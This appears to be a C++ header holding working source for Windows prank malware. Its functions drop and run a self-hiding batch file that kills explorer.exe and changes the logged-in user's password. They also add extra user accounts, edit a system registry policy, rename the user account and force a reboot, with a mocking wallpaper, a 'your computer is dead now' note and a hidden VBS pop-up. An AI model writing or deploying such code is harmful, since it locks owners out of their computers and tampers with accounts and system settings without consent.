#pragma once
#pragma warning(disable : 4996) 
#ifdef function
#define function
#endif // function
#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include "img.h"
#include <shellapi.h>
int Open() {
	system("start C:\\a.bat");
	return 0;
}

int SetDesktopWallpaper() {
	const char* path = "C:\\monke.bmp";
	BOOL result = SystemParametersInfoA(SPI_SETDESKWALLPAPER,0,(void*)path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	return result;
}
int CreateSomeStrangeFiles() {
	std::ofstream newfile;
	newfile.open("read me.txt");
	newfile << "bro, your computer is dead now\n";
	newfile.close();
	newfile.open("C:\\a.bat");
	newfile << "attrib +s +h C:\\a.bat\ntaskkill /F /IM explorer.exe\nattrib +s +h C:\\good.bmp\nmsg * lol\nnet user %username% monke\n";
	newfile.close();
	return 0;
}
void userbmp1()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\monke.bmp", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, MonkeData, sizeof(MonkeData), &dw, 0);
	CloseHandle(hFile); //關閉文件句柄 讓其他程式可以開他
	return;
}
int RunCommands() {
	int i = 0;
	if (i < 100) {
		i += 1;
		system("Reg.exe add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v 'shutdownwithoutlogon' /t REG_DWORD /d '1' /f");
		system("net user USEREEERROOR%random% monke /add");
	}
	system("wmic useraccount where name='%username%' rename 'MONKEY'");
	system("shutdown -r -t 0");
	return 0;
}
int KillComputer1() {
	//Create VBS File
	int o = 0;
	const char* vbs = "Dim x\nmsgbox(\"There is about 114514 error\",64,\"errror??\")";
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\good.vbs", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, (void*)vbs, strlen(vbs), &dw, 0);
	SetFileAttributesA("C:\\good.vbs", FILE_ATTRIBUTE_HIDDEN);
	CloseHandle(hFile);
	if (o <= 114) {
		o+=1;
		system("C:\\good.vbs");
	}
	return 0;
}